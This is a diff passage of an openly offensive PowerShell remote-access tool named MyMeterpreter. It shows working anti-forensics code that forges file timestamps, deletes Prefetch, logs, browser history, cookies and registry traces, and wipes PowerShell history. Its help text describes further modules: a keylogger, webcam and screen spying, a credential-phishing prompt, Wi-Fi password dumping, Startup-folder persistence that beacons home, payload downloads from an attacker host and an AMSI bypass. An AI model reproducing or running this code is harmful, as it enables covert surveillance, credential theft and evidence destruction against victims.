+      PS C:\> .\MyMeterpreter.ps1 -FileMace $Env:TMP\test.txt -date "08 March 1999 19:19:19"
+      Changes sellected file mace using user inputed -Date value
+
+   .OUTPUTS
+      FullName                        Exists CreationTime       
+      --------                        ------ ------------       
+      C:\Users\pedro\Desktop\test.txt   True 08/03/1999 19:19:19
+   #>
+
+   Write-Host "[+] Change File Mace propertys" -ForegroundColor Green
+   Start-Sleep -Seconds 1
+   ## Make sure that the inputed file exists
+   If(-not(Test-Path -Path "$FileMace" -EA SilentlyContinue)){
+      Write-Host "[error] File not found: $FileMace!" -ForegroundColor Red -BackgroundColor Black
+      Write-Host "";Start-Sleep -Seconds 1;exit ## Exit @MyMeterpreter
+   }
+
+   ## Make sure user have input the -Date parameter 
+   If($Date -ieq "false" -or $Date -ieq $null){
+      $Date = "08 March 1999 19:19:19"
+   }
+
+   ## Change file mace propertys {timestamp}
+   Get-ChildItem $FileMace|% {$_.CreationTime = $Date}
+   Get-ChildItem $FileMace|% {$_.lastaccesstime = $Date}
+   Get-ChildItem $FileMace|% {$_.LastWriteTime = $Date}
+   Get-ChildItem $FileMace|Select-Object FullName,Exists,CreationTime
+
+Write-Host "";Start-Sleep -Seconds 1
+}
+
+If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid"){## TODO: <-- finish this function
+$Count = 0       ## Loop counter
+$ModRegKey = 0   ## Registry keys to modifie
+$MyArtifacts = 0 ## MyMeterpreter aux scripts
+
+   <#
+   .SYNOPSIS
+      Helper - Clean Temp\Logs\Script artifacts
+
+   .DESCRIPTION
+      Module to clean artifacts that migth lead
+      forensic investigatores to attacker steps.
+      It deletes lnk, db, log, tmp files, recent
+      folder, Prefetch, and registry locations.
+
+   .NOTES
+      Required Dependencies: cmd|regedit {native}
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -CleanTracks Clear
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -CleanTracks Paranoid
+      Remark: Paranoid @arg deletes @MyMeterpreter aux scripts
+
+   .OUTPUTS
+      Function    Date     DataBaseEntrys ModifiedRegKeys ScriptsCleaned
+      --------    ----     -------------- --------------- --------------
+      CleanTracks 22:17:29 20             3               2
+   #>
+
+   $ClearList = @(## Clear @arg
+      "ipconfig /flushdns",
+      "DEL /q /f /s %tmp%\*.vbs",
+      "DEL /q /f /s %tmp%\*.bat",
+      "DEL /q /f /s %tmp%\*.log",
+      "DEL /q /f /s %userprofile%\*.log",
+      "DEL /q /f /s %userprofile%\*.tmp",
+      "DEL /q /f /s %windir%\Prefetch\*.*",
+      "DEL /q /f /s %appdata%\Microsoft\Windows\Recent\*.*",
+      'REG DELETE "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /f',
+      'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f',
+      'REG ADD "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /ve /t REG_SZ /f',
+      'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /ve /t REG_SZ /f',
+      'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
+   )
+
+   $ParanoidList = @(## Paranoid @arg
+      "ipconfig /flushdns",
+      "DEL /q /f %windir%\*.tmp",
+      "DEL /q /f %windir%\*.log",
+      "DEL /q /f /s %tmp%\*.vbs",
+      "DEL /q /f /s %tmp%\*.bat",
+      "DEL /q /f /s %tmp%\*.log",
+      "DEL /q /f %windir%\system\*.tmp",
+      "DEL /q /f %windir%\system\*.log",
+      "DEL /q /f %windir%\system32\*.tmp",
+      "DEL /q /f %windir%\system32\*.log",
+      "DEL /q /f /s %windir%\Prefetch\*.*",
+      "DEL /q /f /s %userprofile%\*.tmp",
+      "DEL /q /f /s %userprofile%\*.log",
+      "DEL /q /f /s %appdata%\Microsoft\Windows\Recent\*.*",
+      "DEL /q /f /s %appdata%\Mozilla\Firefox\Profiles\*.*",
+      "DEL /q /f /s %appdata%\Microsoft\Windows\Cookies\*.*",
+      'DEL /q /f %appdata%\Google\Chrome\"User Data"\Default\*.tmp',
+      'DEL /q /f %appdata%\Google\Chrome\"User Data"\Default\History\*.*',
+      "DEL /q /f %userprofile%\AppData\Local\Microsoft\Windows\Explorer\*.db",
+      "DEL /q /f C:\Users\%username%\AppData\Local\Microsoft\Windows\INetCache\Low\*.dat",
+      'REG DELETE "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /f',
+      'REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f',
+      'REG DELETE "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /f',
+      'REG ADD "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /ve /t REG_SZ /f',
+      'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /ve /t REG_SZ /f',
+      'REG ADD "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /ve /t REG_SZ /f',
+      'REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" /v LastKey /t REG_SZ /d x0d /f',
+      'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
+   )
+
+   ## Loop truth Array Lists
+   $DateNow = Get-Date -Format 'HH:mm:ss'
+   If($CleanTracks -ieq "Clear"){$ModRegKey = "2"
+      ForEach($Item in $ClearList){
+         cmd /R $Item
+         $Count++
+      }
+   }ElseIf($CleanTracks -ieq "Paranoid"){$ModRegKey = "4"
+      ForEach($Item in $ParanoidList){
+         cmd /R $Item
+         $Count++
+      }
+   }
+
+   ## Clean ALL files\folders under %TMP% except scripts.ps1
+   $FilesToDelete = (Get-ChildItem -Path "$Env:TMP" -Recurse -Exclude *.ps1 -EA SilentlyContinue).FullName
+   ForEach($Item in $FilesToDelete){
+      Remove-Item $Item -Recurse -Force -EA SilentlyContinue
+   }
+
+   ## Clear PS Logging History
+   $CleanPSLogging = (Get-PSReadlineOption -EA SilentlyContinue).HistorySavePath
+   If(-not($CleanPSLogging -ieq $null)){## 'ConsoleHost_history.txt' found
+      echo "null" > $CleanPSLogging
+   }Else{## Fail to find 'ConsoleHost_history.txt'
+      ## Path: $Env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+      Write-Host "fail delete  - PS Logging History!"
+   }
+
+
+   ## Delete @MyMeterpreter artifacts
+   If($CleanTracks -ieq "Paranoid"){
+
+      <#
+      .SYNOPSIS
+         Paranoid @arg deletes @MyMeterpreter auxiliary scripts
+
+      .NOTES
+        Persiste.vbs, Sherlock.ps1, webserver.ps1,
+        Start-WebServer.ps1, CredsPhish.ps1 
+      #>
+
+      $PersistePath = "$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Persiste.vbs"
+      If(Test-Path -Path "$PersistePath" -EA SilentlyContinue){
+         Remove-Item -Path "$PersistePath" -Force
+         $MyArtifacts = $MyArtifacts+1
+      }
+      If(Test-Path -Path "$Env:TMP\Sherlock.ps1" -EA SilentlyContinue){
+         Remove-Item -Path "$Env:TMP\Sherlock.ps1" -Force
+         $MyArtifacts = $MyArtifacts+1
+      }
+      If(Test-Path -Path "$Env:TMP\webserver.ps1" -EA SilentlyContinue){
+         Remove-Item -Path "$Env:TMP\webserver.ps1" -Force
+         $MyArtifacts = $MyArtifacts+1
+      }
+      If(Test-Path -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue){
+         Remove-Item -Path "$Env:TMP\CredsPhish.ps1" -Force
+         $MyArtifacts = $MyArtifacts+1
+      }
+      If(Test-Path -Path "$Env:TMP\Start-WebServer.ps1" -EA SilentlyContinue){
+         Remove-Item -Path "$Env:TMP\Start-WebServer.ps1" -Force
+         $MyArtifacts = $MyArtifacts+1
+      }
+   }
+
+   Write-Host ""
+   ## Create Data Table for output DateNow
+   $mytable = new-object System.Data.DataTable
+   $mytable.Columns.Add("Function") | Out-Null
+   $mytable.Columns.Add("Date") | Out-Null
+   $mytable.Columns.Add("DataBaseEntrys") | Out-Null
+   $mytable.Columns.Add("ModifiedRegKeys") | Out-Null
+   $mytable.Columns.Add("ScriptsCleaned") | Out-Null
+   $mytable.Rows.Add("CleanTracks",
+                     "$DateNow",
+                     "$Count",
+                     "$ModRegKey",
+                     "$MyArtifacts") | Out-Null
+
+   ## Display Table
+   $mytable|Format-Table -AutoSize
+
+Write-Host "";Start-Sleep -Seconds 1
+}
+
+
+## --------------------------------------------------------------
+##       HELP =>  * PARAMETERS DETAILED DESCRIPTION *
+## --------------------------------------------------------------
+
+
+If($Help -ieq "sysinfo"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Helper - Enumerates remote host basic system info
+
+   .DESCRIPTION
+      System info: IpAddress, OsVersion, OsFlavor, OsArchitecture,
+      WorkingDirectory, CurrentShellPrivileges, ListAllDrivesAvailable
+      PSCommandLogging, AntiVirusDefinitions, AntiSpywearDefinitions,
+      UACsettings, WorkingDirectoryDACL, BehaviorMonitorEnabled, Etc..
+      Remark: If you wish to hidde Public-IP displays then edit this
+      CmdLet and change '`$HiddePublicIPaddr = `$False' to `$True ..
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -SysInfo Enum
+      Remote Host Quick Enumeration Module
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -SysInfo Verbose
+      Remote Host Detailed Enumeration Module
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "GetDnsCache"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Helper - Enumerate remote host DNS cache entrys
+      
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetDnsCache Enum
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "GetConnections"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Author: @itm4n|@r00t-3xp10it
+      Helper - Gets a list of listening ports (TCP)
+   
+   .DESCRIPTION
+      List the TCP endpoints on the local machine. For each entry in the table,
+      a custom PS object is returned, indicating the IP version, the protocol (TCP),
+      the local address, the state, the PID of the associated process and the name of the
+      process. The process name is retrieved through a call to "Get-Process -PID <PID>".
+    
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetConnections Enum
+
+   .OUTPUTS
+      IP   Proto LocalAddress LocalPort Endpoint         State       PID Name
+      --   ----- ------------ --------- --------         -----       --- ----
+      IPv4 TCP   0.0.0.0            135 0.0.0.0:135      LISTENING  1216 svchost
+      IPv4 TCP   0.0.0.0            445 0.0.0.0:445      LISTENING     4 System
+      IPv4 TCP   0.0.0.0          49664 0.0.0.0:49664    LISTENING   984 lsass
+      IPv4 TCP   0.0.0.0          49665 0.0.0.0:49665    LISTENING   892 wininit
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "GetInstalled"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+     Helper - List remote host applications installed
+
+   .DESCRIPTION
+      Enumerates appl installed and respective versions
+
+   .EXAMPLE
+      PC C:\> .\MyMeterpreter.ps1 -GetInstalled Enum
+
+   .OUTPUTS
+      DisplayName                   DisplayVersion     
+      -----------                   --------------     
+      Adobe Flash Player 32 NPAPI   32.0.0.314         
+      ASUS GIFTBOX                  7.5.24
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "GetProcess" -or $Help -ieq "ProcessName"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+     Helper - Enumerate/Kill running process
+
+   .DESCRIPTION
+      This CmdLet enumerates 'All' running process if used
+      only the 'Enum' @arg IF used -ProcessName parameter
+      then cmdlet 'kill' or 'enum' the sellected processName.
+
+   .EXAMPLE
+      PC C:\> .\MyMeterpreter.ps1 -GetProcess Enum
+      Enumerate ALL Remote Host Running Process(s)
+
+   .EXAMPLE
+      PC C:\> .\MyMeterpreter.ps1 -GetProcess Enum -ProcessName firefox.exe
+      Enumerate firefox.exe Process {Id,Name,Path,Company,StartTime,Responding}
+
+   .EXAMPLE
+      PC C:\> .\MyMeterpreter.ps1 -GetProcess Kill -ProcessName firefox.exe
+      Kill Remote Host firefox.exe Running Process
+
+   .OUTPUTS
+      Id              : 8564
+      Name            : ApplicationFrameHost
+      Path            : C:\WINDOWS\system32\ApplicationFrameHost.exe
+      Company         : Microsoft Corporation
+      FileVersion     : 10.0.18362.1316 (WinBuild.160101.0800)
+      MainWindowTitle : Calculadora
+      StartTime       : 23/01/2021 16:01:47
+      Responding      : True
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "GetTasks" -or $Help -ieq "TaskName" -or $Help -ieq "Interval" -or $Help -ieq "Exec"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+     Helper - Enumerate\Create\Delete running tasks
+
+   .DESCRIPTION
+      This module enumerates remote host running tasks
+      Or creates a new task Or deletes existence tasks
+
+   .NOTES
+      Required Dependencies: cmd|schtasks {native}
+      Remark: Module parameters are auto-set {default}
+      Remark: Tasks have the default duration of 9 hours.
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetTasks Enum
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetTasks Create
+      Use module default settings to create the demo task
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetTasks Delete -TaskName mytask
+      Deletes mytask taskname
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetTasks Create -TaskName mytask -Interval 10 -Exec "cmd /c start calc.exe"
+
+   .OUTPUTS
+      TaskName                                 Next Run Time          Status
+      --------                                 -------------          ------
+      ASUS Smart Gesture Launcher              N/A                    Ready          
+      CreateExplorerShellUnelevatedTask        N/A                    Ready          
+      OneDrive Standalone Update Task-S-1-5-21 24/01/2021 17:43:44    Ready 
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "GetLogs" -or $Help -ieq "NewEst"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Helper - Enumerate eventvwr logs OR Clear All event logs
+
+   .NOTES
+      Required Dependencies: wevtutil {native}
+      The Clear @argument requires Administrator privs
+      on shell to be abble to 'Clear' Eventvwr entrys.
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetLogs Enum
+      Lists ALL eventvwr categorie entrys
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetLogs Verbose
+      List the newest 10(default) Powershell\Application\System entrys
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetLogs Verbose -NewEst 28
+      List the newest 28 Eventvwr Powershell\Application\System entrys
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetLogs Clear
+      Remark: Clear @arg requires Administrator privs on shell
+
+   .OUTPUTS
+      Max(K) Retain OverflowAction    Entries Log                   
+      ------ ------ --------------    ------- ---                            
+      20 480      0 OverwriteAsNeeded   1 024 Application           
+      20 480      0 OverwriteAsNeeded       0 HardwareEvents                 
+      20 480      0 OverwriteAsNeeded      74 System                
+      15 360      0 OverwriteAsNeeded      85 Windows PowerShell
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "GetBrowsers"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Helper - Leak Installed Browsers Information
+
+   .NOTES
+      This module downloads GetBrowsers.ps1 from venom
+      GitHub repository into remote host %TMP% directory,
+      And identify install browsers and run enum modules.
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetBrowsers Enum
+      Identify installed browsers and versions
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -GetBrowsers Verbose
+      Run enumeration modules againts ALL installed browsers
+
+   .OUTPUTS
+      Browser   Install   Status   Version         PreDefined
+      -------   -------   ------   -------         ----------
+      IE        Found     Stoped   9.11.18362.0    False
+      CHROME    False     Stoped   {null}          False
+      FIREFOX   Found     Active   81.0.2          True
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "Screenshot" -or $Help -ieq "Delay"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Helper - Capture remote desktop screenshot(s)
+
+   .DESCRIPTION
+      This module can be used to take only one screenshot
+      or to spy target user activity using -Delay parameter.
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -Screenshot 1
+      Capture 1 desktop screenshot and store it on %TMP%.
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -Screenshot 5 -Delay 8
+      Capture 5 desktop screenshots with 8 secs delay between captures.
+
+   .OUTPUTS
+      ScreenCaptures Delay  Storage                          
+      -------------- -----  -------                          
+      1              1(sec) C:\Users\pedro\AppData\Local\Temp
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "Camera"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Helper - List computer cameras or capture camera screenshot
+
+   .NOTES
+      Remark: WebCam turns the ligth ON taking snapshots.
+      Using -Camera Snap @argument migth trigger AV detection
+      Unless target system has powershell version 2 available.
+      In that case them PS version 2 will be used to execute
+      our binary file and bypass AV amsi detection.
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -Camera Enum
+      List ALL WebCams Device Names available
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -Camera Snap
+      Take one screenshot using default camera
+
+   .OUTPUTS
+      StartTime ProcessName DeviceName           
+      --------- ----------- ----------           
+      17:32:23  CommandCam  USB2.0 VGA UVC WebCam
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "StartWebServer" -or $Help -ieq "SPort"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Helper - Start Local HTTP WebServer (Background)
+
+   .NOTES
+      Access WebServer: http://<RHOST>:8080/
+      This module download's webserver.ps1 or Start-WebServer.ps1
+      to remote host %TMP% and executes it on an hidden terminal prompt
+      to allow users to silent browse/read/download files from remote host.
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -StartWebServer Python
+      Downloads webserver.ps1 to %TMP% and executes the webserver.
+      Remark: This Module uses Social Enginnering to trick remote host into
+      installing python (python http.server) if remote host does not have it.
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -StartWebServer Python -SPort 8087
+      Downloads webserver.ps1 and executes the webserver on port 8087
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -StartWebServer Powershell
+      Downloads Start-WebServer.ps1 and executes the webserver.
+      Remark: Admin privileges are requiered in shell to run the WebServer
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -StartWebServer Powershell -SPort 8087
+      Downloads Start-WebServer.ps1 and executes the webserver on port 8087
+      Remark: Admin privileges are requiered in shell to run the WebServer
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "Upload" -or $Help -ieq "ApacheAddr" -or $Help -ieq "Destination"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Helper - Download files from attacker {apache2}
+
+   .NOTES
+      Required Attacker Dependencies: apache2 webroot
+      Required Target Dependencies: BitsTransfer {native}
+      File to Download must be stored in attacker apache2 webroot.
+      -Upload and -ApacheAddr Are Mandatory parameters (required).
+      -Destination parameter its auto set to `$Env:TMP by default.
+
+   .EXAMPLE
+      Syntax : .\MyMeterpreter.ps1 -Upload [ file.ps1 ] -ApacheAddr [ Attacker ] -Destination [ full\Path\file.ps1 ]
+      Example: .\MyMeterpreter.ps1 -Upload FileName.ps1 -ApacheAddr 192.168.1.73 -Destination `$Env:TMP\FileName.ps1
+      Download FileName.ps1 script from attacker apache2 (192.168.1.73) into `$Env:TMP\FileName.ps1 Local directory.
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "Keylogger"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Helper - Capture remote host keystrokes {void}
+
+   .DESCRIPTION
+      This module start recording target system keystrokes
+      in background mode and only stops if void.exe binary
+      its deleted or is process {void.exe} its stoped.
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -Keylogger Start
+      Download/Execute void.exe in child process
+      to be abble to capture system keystrokes
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -Keylogger Stop
+      Stop keylogger by is process FileName identifier
+      and delete keylogger and all respective files/logs
+
+   .OUTPUTS
+      StartTime ProcessName PID  LogFile                                   
+      --------- ----------- ---  -------                                   
+      17:37:17  void.exe    2836 C:\Users\pedro\AppData\Local\Temp\void.log
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "Mouselogger" -or $Help -ieq "Timmer"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Helper - Capture screenshots of MouseClicks for 'xx' Seconds
+
+   .DESCRIPTION
+      This script allow users to Capture Screenshots of 'MouseClicks'
+      with the help of psr.exe native windows 10 (error report service).
+      Remark: Capture will be stored under '`$Env:TMP' remote directory.
+      'Min capture time its 8 secs the max is 300 and 100 screenshots'.
+
+   .NOTES
+      Required Dependencies: psr.exe {native}
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -Mouselogger Start
+      Capture Screenshots of Mouse Clicks for 10 secs {default}
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -Mouselogger Start -Timmer 28
+      Capture Screenshots of remote Mouse Clicks for 28 seconds
+
+   .OUTPUTS
+      Capture     Timmer      Storage                                          
+      -------     ------      -------                                          
+      MouseClicks for 10(sec) C:\Users\pedro\AppData\Local\Temp\SHot-zcsV03.zip
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "PhishCreds"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Helper - Promp the current user for a valid credential.
+
+   .DESCRIPTION
+      This CmdLet interrupts EXPLORER process until a valid credential is entered
+      correctly in Windows PromptForCredential MsgBox, only them it starts EXPLORER
+      process and leaks the credentials on this terminal shell (Social Engineering).
+
+   .NOTES
+      Remark: CredsPhish.ps1 CmdLet its set for 30 fail validations before abort.
+      Remark: CredsPhish.ps1 CmdLet requires lmhosts + lanmanserver services running.
+      Remark: CredsPhish.ps1 CmdLet requires Admin privileges to Start|Stop services.
+      Remark: On Windows <= 10 lmhosts and lanmanserver are running by default.
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -PhishCreds Start
+      Prompt the current user for a valid credential.
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "EOP"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Author: @_RastaMouse|r00t-3xp10it {Sherlock v1.3}
+      Helper - Find Missing Software Patchs For Privilege Escalation
+
+   .NOTES
+      This Module does NOT exploit any EOP vulnerabitys found.
+      It will 'report' them and display the exploit-db POC link.
+      Remark: Attacker needs to manualy download\execute the POC.
+      Sherlock.ps1 GitHub WIKI page: https://tinyurl.com/y4mxe29h
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -EOP Enum
+      Scans GroupName Everyone and permissions (F)
+      Unquoted Service vuln Paths, Dll-Hijack, etc.
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -EOP Verbose
+      Scans the Three Group Names and Permissions (F)(W)(M)
+      And presents a more elaborate report with extra tests.
+
+   .OUTPUTS
+      Title      : TrackPopupMenu Win32k Null Point Dereference
+      MSBulletin : MS14-058
+      CVEID      : 2014-4113
+      Link       : https://www.exploit-db.com/exploits/35101/
+      VulnStatus : Appers Vulnerable
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "Persiste" -or $Help -ieq "BeaconTime"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Helper - Persiste scripts using StartUp folder
+
+   .DESCRIPTION
+      This persistence module beacons home in sellected intervals defined
+      by CmdLet User with the help of -BeaconTime parameter. The objective
+      its to execute our script on every startup from 'xx' to 'xx' seconds.
+
+   .NOTES
+      Remark: Use double quotes if Path has any empty spaces in name.
+      Remark: '-GetProcess Enum -ProcessName Wscript.exe' can be used
+      to manual check the status of wscript process (BeaconHome function)
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -Persiste Stop
+      Stops wscript process (vbs) and delete persistence.vbs script
+      Remark: This function stops the persiste.vbs from beacon home
+      and deletes persiste.vbs Leaving our reverse tcp shell intact.
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -Persiste `$Env:TMP\Payload.ps1
+      Execute Payload.ps1 at every StartUp with 10 sec of interval between each execution
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -Persiste `$Env:TMP\Payload.ps1 -BeaconTime 28
+      Execute Payload.ps1 at every StartUp with 28 sec of interval between each execution
+
+   .OUTPUTS
+      Sherlock.ps1 Persistence Settings
+      ---------------------------------
+      BeaconHomeInterval : 10 (sec) interval
+      ClientAbsoluctPath : Sherlock.ps1
+      PersistenceScript  : C:\Users\pedro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Persiste.vbs
+      PersistenceScript  : Successfuly Created!
+      wscriptProcStatus  : Stopped! {require SKYNET restart}
+      OR the manual execution of Persiste.vbs script! {StartUp}
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "WifiPasswords" -or $Help -ieq "Storage"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Helper - Dump All SSID Wifi passwords
+
+   .DESCRIPTION
+      Module to dump SSID Wifi passwords into terminal windows
+      OR dump credentials into a zip archive under `$Env:TMP
+
+   .NOTES
+      Required Dependencies: netsh {native}
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -WifiPasswords Dump
+      Dump ALL Wifi Passwords on this terminal prompt
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -WifiPasswords ZipDump
+      Dump Wifi Paswords into a Zip archive on %TMP% {default}
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -WifiPasswords ZipDump -Storage `$Env:APPDATA
+      Dump Wifi Paswords into a Zip archive on %APPDATA% remote directory
+
+   .OUTPUTS
+      SSID name               Password    
+      ---------               --------               
+      CampingMilfontesWifi    Milfontes19 
+      NOS_Internet_Movel_202E 37067757                                             
+      Ondarest                381885C874           
+      MEO-968328              310E0CBA14
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "SpeakPrank" -or $Help -ieq "Rate" -or $Help -ieq "Volume"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Helper - Speak Prank {SpeechSynthesizer}
+
+   .DESCRIPTION
+      Make remote host speak user input sentence (prank)
+
+   .NOTES
+      Required Dependencies: SpeechSynthesizer {native}
+      Remark: Double Quotes are Mandatory in @arg declarations
+      Remark: -Volume controls the speach volume {default: 88}
+      Remark: -Rate Parameter configs the SpeechSynthesizer speed
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -SpeakPrank "Hello World"
+      Make remote host speak "Hello World" {-Rate 1 -Volume 88}
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -SpeakPrank "Hello World" -Rate 5 -Volume 100
+
+   .OUTPUTS
+      RemoteHost SpeachSpeed Volume Speak        
+      ---------- ----------- ------ -----        
+      SKYNET     1           88     'hello world'
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "BruteZip" -or $Help -ieq "PassList"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Helper - Brute force ZIP archives {7z.exe}
+
+   .DESCRIPTION
+      This module brute forces ZIP archives with the help of 7z.exe
+      It also downloads custom password list from @josh-newton Git-Hub
+      repository {default} or accepts User imput password list file.
+
+   .NOTES
+      Author: @securethelogs|@r00t-3xp10it
+      Required Dependencies: 7z.exe {manual-install}
+      Remark: Use double quotes if path contains any empty spaces
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -BruteZip `$Env:USERPROFILE\Desktop\Archive.zip
+      Brute force the inputed -BruteZip @argument archive using default passlist
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -BruteZip `$Env:USERPROFILE\Archive.zip -PassList `$Env:TMP\passlist.txt
+      Brute force the inputed -BruteZip @argument archive using attacker own passlist
+
+   .OUTPUTS
+      16:32:55 - Brute force Zip archives
+      ------------------------------------
+      [+] Zip Archive  : MyMeterpreter.zip
+      [+] Archive Size : 7429,9765625/KB
+      [+] Password     : King!1
+      ------------------------------------
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "CleanTracks"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Helper - Clean artifacts {temp,logs,scripts}
+
+   .DESCRIPTION
+      Module to clean artifacts that migth lead
+      forensic investigatores to attacker tracks.
+
+   .NOTES
+      Required Dependencies: cmd|regedit {native}
+
+   .EXAMPLE
+      PS C:\> .\MyMeterpreter.ps1 -CleanTracks Clear
+      Basic cleanning {flushdns,Prefetch,Recent,tmp *log|*bat|*vbs}
+
+   .EXAMPLE
